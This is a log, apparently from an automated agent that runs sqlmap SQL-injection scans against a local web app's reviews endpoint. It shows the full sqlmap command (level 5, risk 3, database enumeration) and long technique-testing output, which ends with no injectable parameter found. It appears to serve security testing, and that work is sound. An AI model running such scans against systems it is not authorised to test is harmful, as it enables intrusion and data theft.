[19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:04:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:04:21] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:04:21] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:04:22] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:04:23] [WARNING] parameter 'Host' does not seem to be injectable
[19:04:23] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:04:23] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 3453 times, 404 (Not Found) - 4 times

[*] ending @ 19:04:23 /2025-09-26/

2025-09-26 19:04:23,397 - WARNING - Potential injection detected. Output saved to attack-logs-dynamic\Get_reviews_for_a_product_discovery.log
2025-09-26 19:04:23,398 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
2025-09-26 19:04:26,668 - INFO -         ___
2025-09-26 19:04:26,668 - INFO -        __H__
2025-09-26 19:04:26,668 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:04:26,668 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 19:04:26,668 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 19:04:26,668 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:04:26,668 - INFO - 
2025-09-26 19:04:26,699 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:04:26,699 - INFO - 
2025-09-26 19:04:26,699 - INFO - [*] starting @ 19:04:26 /2025-09-26/
2025-09-26 19:04:26,699 - INFO - 
2025-09-26 19:04:28,543 - INFO - [19:04:28] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
2025-09-26 19:04:29,057 - INFO - [19:04:29] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:04:29,057 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:04:29,078 - INFO - [19:04:29] [INFO] testing connection to the target URL
2025-09-26 19:04:29,155 - INFO - [19:04:29] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:04:29,155 - INFO - [19:04:29] [INFO] testing if the target URL content is stable
2025-09-26 19:04:29,598 - INFO - [19:04:29] [INFO] target URL content is stable
2025-09-26 19:04:29,598 - INFO - [19:04:29] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:04:29,646 - INFO - [19:04:29] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:04:29,672 - INFO - [19:04:29] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:04:29,682 - INFO - [19:04:29] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:04:29,740 - INFO - [19:04:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:29,783 - INFO - [19:04:29] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:04:30,898 - INFO - [19:04:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:32,179 - INFO - [19:04:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:33,177 - INFO - [19:04:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:34,118 - INFO - [19:04:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:34,755 - INFO - [19:04:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:34,970 - INFO - [19:04:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:35,176 - INFO - [19:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:04:35,399 - INFO - [19:04:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:04:35,891 - INFO - [19:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:04:36,384 - INFO - [19:04:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:04:36,861 - INFO - [19:04:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:04:37,365 - INFO - [19:04:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:04:37,824 - INFO - [19:04:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:04:38,804 - INFO - [19:04:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:04:39,748 - INFO - [19:04:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:04:40,737 - INFO - [19:04:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:04:41,586 - INFO - [19:04:41] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:04:42,761 - INFO - [19:04:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:04:43,672 - INFO - [19:04:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:04:44,969 - INFO - [19:04:44] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:04:46,192 - INFO - [19:04:46] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:04:47,183 - INFO - [19:04:47] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:04:48,084 - INFO - [19:04:48] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:04:48,921 - INFO - [19:04:48] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:04:49,715 - INFO - [19:04:49] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:04:50,735 - INFO - [19:04:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:50,757 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 19:04:50,784 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 19:04:50,808 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 19:04:50,828 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 19:04:50,846 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 19:04:50,866 - INFO - [19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 19:04:50,909 - INFO - [19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 19:04:50,927 - INFO - [19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:50,947 - INFO - [19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 19:04:50,970 - INFO - [19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 19:04:50,994 - INFO - [19:04:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 19:04:51,028 - INFO - [19:04:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:51,065 - INFO - [19:04:51] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
2025-09-26 19:04:51,065 - INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:04:51,073 - INFO - [19:04:51] [INFO] testing 'Generic inline queries'
2025-09-26 19:04:51,103 - INFO - [19:04:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:04:51,106 - INFO - [19:04:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:04:51,301 - INFO - [19:04:51] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:04:51,510 - INFO - [19:04:51] [INFO] target URL appears to be UNION injectable with 6 columns
2025-09-26 19:04:51,902 - INFO - [19:04:51] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
2025-09-26 19:04:51,913 - INFO - [19:04:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:04:52,139 - INFO - [19:04:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:04:52,323 - INFO - [19:04:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:04:52,502 - INFO - [19:04:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:04:52,713 - INFO - [19:04:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:04:52,941 - INFO - [19:04:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:04:53,119 - INFO - [19:04:53] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:04:53,322 - INFO - [19:04:53] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:04:53,514 - INFO - [19:04:53] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
2025-09-26 19:04:53,538 - INFO - [19:04:53] [WARNING] false positive or unexploitable injection point detected
2025-09-26 19:04:53,538 - INFO - [19:04:53] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:04:53,538 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 19:04:53,538 - INFO - [19:04:53] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 19:04:53,543 - INFO - [19:04:53] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 19:04:53,558 - INFO - [19:04:53] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 19:04:53,572 - INFO - [19:04:53] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 19:04:53,636 - INFO - [19:04:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:54,098 - INFO - [19:04:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:54,871 - INFO - [19:04:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:55,323 - INFO - [19:04:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:55,659 - INFO - [19:04:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:04:56,053 - INFO - [19:04:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:56,146 - INFO - [19:04:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:04:56,286 - INFO - [19:04:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:04:56,385 - INFO - [19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:04:56,401 - INFO - [19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:04:56,420 - INFO - [19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:04:56,435 - INFO - [19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:04:56,452 - INFO - [19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:04:56,474 - INFO - [19:04:56] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:04:56,847 - INFO - [19:04:56] [INFO] testing 'Generic inline queries'
2025-09-26 19:04:56,868 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:04:56,868 - INFO - [19:04:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:04:57,451 - INFO - [19:04:57] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:04:58,062 - INFO - [19:04:58] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 19:04:58,062 - INFO - [19:04:58] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 19:04:58,072 - INFO - [19:04:58] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 19:04:58,083 - INFO - [19:04:58] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 19:04:58,093 - INFO - [19:04:58] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 19:04:58,153 - INFO - [19:04:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:58,575 - INFO - [19:04:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:04:59,307 - INFO - [19:04:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:04:59,712 - INFO - [19:04:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:05:00,010 - INFO - [19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:05:00,471 - INFO - [19:05:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:05:00,586 - INFO - [19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:05:00,735 - INFO - [19:05:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:05:00,823 - INFO - [19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:05:00,833 - INFO - [19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:05:00,833 - INFO - [19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:05:00,855 - INFO - [19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:05:00,866 - INFO - [19:05:00] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:05:00,879 - INFO - [19:05:00] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:05:01,213 - INFO - [19:05:01] [INFO] testing 'Generic inline queries'
2025-09-26 19:05:01,240 - INFO - [19:05:01] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:05:01,889 - INFO - [19:05:01] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:05:02,425 - INFO - [19:05:02] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 19:05:02,425 - INFO - [19:05:02] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 19:05:02,438 - INFO - [19:05:02] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 19:05:02,438 - INFO - [19:05:02] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 19:05:02,460 - INFO - [19:05:02] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 19:05:02,523 - INFO - [19:05:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:05:03,024 - INFO - [19:05:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:05:03,804 - INFO - [19:05:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:05:04,228 - INFO - [19:05:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:05:04,528 - INFO - [19:05:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:05:04,911 - INFO - [19:05:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:05:05,003 - INFO - [19:05:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:05:05,155 - INFO - [19:05:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:05:05,242 - INFO - [19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:05:05,276 - INFO - [19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:05:05,305 - INFO - [19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:05:05,325 - INFO - [19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:05:05,340 - INFO - [19:05:05] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:05:05,360 - INFO - [19:05:05] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:05:05,683 - INFO - [19:05:05] [INFO] testing 'Generic inline queries'
2025-09-26 19:05:05,696 - INFO - [19:05:05] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:05:06,353 - INFO - [19:05:06] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:05:06,909 - INFO - [19:05:06] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 19:05:06,909 - INFO - [19:05:06] [CRITICAL] all tested parameters do not appear to be injectable. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:05:06,909 - INFO - [19:05:06] [WARNING] HTTP error codes detected during run:
2025-09-26 19:05:06,919 - INFO - 500 (Internal Server Error) - 3455 times, 404 (Not Found) - 4 times
2025-09-26 19:05:06,919 - INFO - 
2025-09-26 19:05:06,921 - INFO - [*] ending @ 19:05:06 /2025-09-26/
2025-09-26 19:05:06,921 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/reviews/test --output-dir 'attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --dbs
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:04:26 /2025-09-26/

[19:04:28] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_reviews_for_a_product_sqlmap' as the output directory
[19:04:29] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:04:29] [INFO] testing connection to the target URL
[19:04:29] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:04:29] [INFO] testing if the target URL content is stable
[19:04:29] [INFO] target URL content is stable
[19:04:29] [INFO] testing if URI parameter '#1*' is dynamic
[19:04:29] [INFO] URI parameter '#1*' appears to be dynamic
[19:04:29] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:04:29] [INFO] testing for SQL injection on URI parameter '#1*'
[19:04:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:29] [WARNING] reflective value(s) found and filtering out
[19:04:30] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:04:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:04:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:04:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:04:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:04:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:04:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:04:37] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:04:38] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:04:39] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:04:40] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:04:41] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:04:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:04:44] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:04:46] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:04:47] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:04:48] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:04:48] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:04:49] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:04:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:04:50] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[19:04:50] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[19:04:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[19:04:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[19:04:51] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:04:51] [INFO] testing 'Generic inline queries'
[19:04:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:04:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:04:51] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:04:51] [INFO] target URL appears to be UNION injectable with 6 columns
[19:04:51] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[19:04:51] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:04:52] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:04:52] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:04:52] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:04:52] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:04:52] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:04:53] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:04:53] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:04:53] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[19:04:53] [WARNING] false positive or unexploitable injection point detected
[19:04:53] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[19:04:53] [INFO] testing if parameter 'User-Agent' is dynamic
[19:04:53] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:04:53] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:04:53] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:04:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:04:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:04:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:04:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:04:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[19:04:56] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[19:04:56] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[19:04:56] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:04:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:04:57] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[19:04:58] [WARNING] parameter 'User-Agent' does not seem to be injectable
[19:04:58] [INFO] testing if parameter 'Referer' is dynamic
[19:04:58] [WARNING] parameter 'Referer' does not appear to be dynamic
[19:04:58] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
[19:04:58] [INFO] testing for SQL injection on parameter 'Referer'
[19:04:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:04:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
